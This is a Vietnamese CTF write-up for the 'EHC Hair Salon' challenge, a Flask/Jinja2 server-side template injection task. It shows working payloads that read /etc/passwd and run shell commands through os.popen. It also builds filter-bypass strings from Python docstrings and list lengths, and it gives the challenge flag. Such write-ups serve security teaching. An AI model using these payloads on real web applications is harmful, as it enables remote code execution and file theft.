
# Write-up EHC Hair Salon

* [Source code](https://github.com/5c4ll10n/FPTU-Hacking-CTF-2022/blob/main/Data/app.py)

Challenge này cho ta một trang web với giao diện như hình, có 1 box để input text và 1 nút submit

![image](https://user-images.githubusercontent.com/82231862/176257788-ee5d0482-a574-4cf0-9a51-598ba054eaa9.png)

Xem source code, ta thấy tác giả đã import module flask và sử dụng jinja2 để render ra page


![image](https://user-images.githubusercontent.com/82231862/176261133-3e96b201-903e-48e1-b799-4d563236713e.png)

![image](https://user-images.githubusercontent.com/82231862/176261062-61d6cf64-73d6-4908-a28a-f580cb08dc25.png)

Với web không filter user input, ta có thể dễ dàng inject code vào. Ví dụ:

* `{{2*3}}` sẽ được render ra là 6

Chúng ta còn có thể inject các đoạn code như [read file](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---read-remote-file) hoặc [remote code execution](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---remote-code-execution). Ví dụ:

* `{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}` trả về nội dung file password
* `{{ cycler.__init__.__globals__.os.popen('id').read() }}` chạy lệnh `id` trong shell

Nhưng trong challenge này, input đã tác giả đã filter đi khá nhiều

```python
regex = "request|config|self|class|flag|0|1|2|3|4|5|6|7|8|9|\"|\'|\\|\~|\%|\#" 
# filter đi string, số, flag, các char và 1 số lệnh cơ bản. Quan trong nhất là string và số để ta có thể tạo payload
...
       hair_type = request.form['hair'].lower()
       if '{' in hair_type and re.search(regex,hair_type):
            return render_template_string(error_page)
            
       if len(hair_type) > 256:
            return render_template_string(error_page)      
# giới hạn số kí tự tối đa có thể nhập vào
...
```

Không thể tạo payload trực tiếp, ta sẽ đi đường vòng bằng cách sử dụng các attribute và method có sẵn của python. Ví dụ:

* `().__doc__` sẽ trả về doc của tuple: `Built-in immutable sequence.\n\nIf no argument is given, the constructor returns an empty tuple.\nIf iterable is specified the tuple is initialized from iterable's items.\n\nIf the argument is a tuple, the return value is the same object.`
* `().__doc__[7]` sẽ trả về kí tự thứ 5 của string trên: `n`
* `().__str__.__name__` sẽ trả về `__str__`

Vì tác giả đã filter số nên ta có thể sử dụng hàm `[..].__len__()` để trả về số phần tử của 1 mảng. Ví dụ:

* `[].__len__()` sẽ trả về số phần tử của mảng rỗng là: `0`
* `[[],[],[],[]].__len__()` sẽ trả về: `4`

Kết hợp 2 cái ta sẽ có được:

* `().__doc__[[[],[],[]].__len__()]` để trả về kí tự `l`
* `().__str__.__name__[[[],[]].__len__()]` để trả về kí tự `s`

Chúng ta thử inject payload bằng cách gọi [os.popen().read()](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#exploit-the-ssti-by-calling-ospopenread) để chạy lệnh `ls` trong shell

* `{{cycler.__init__.__globals__.os.popen(().__doc__[[[],[],[]].__len__()]+().__str__.__name__[[[],[]].__len__()]).read()}}`  dùng dấu `+` để ghép chuỗi

Ta tìm được file tên là **flag** trong thư mục

![image](https://user-images.githubusercontent.com/82231862/176274512-1734c739-247a-47f2-bb79-28e18e829180.png)

Tiếp theo để mở file đó, ta sẽ dùng [read file](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---read-remote-file) để đọc file **flag**. Ta được payload như sau:

`{{get_flashed_messages.__globals__.__builtins__.open(().__format__.__name__[[[],[]].__len__()]+().__le__.__name__[[[],[]].__len__()]+().__add__.__name__[[[],[]].__len__()]+().__ge__.__name__[[[],[]].__len__()]).read()}}`

Kết quả: 

![image](https://user-images.githubusercontent.com/82231862/176280207-17d6dfb8-d240-4d4f-9b21-48899a300f4b.png)

### FLAG: FPTUHacking{d4y_d1_0ng_ch4u_0i,ban_da_thoat_khoi_EHC_hair_salon_roi}
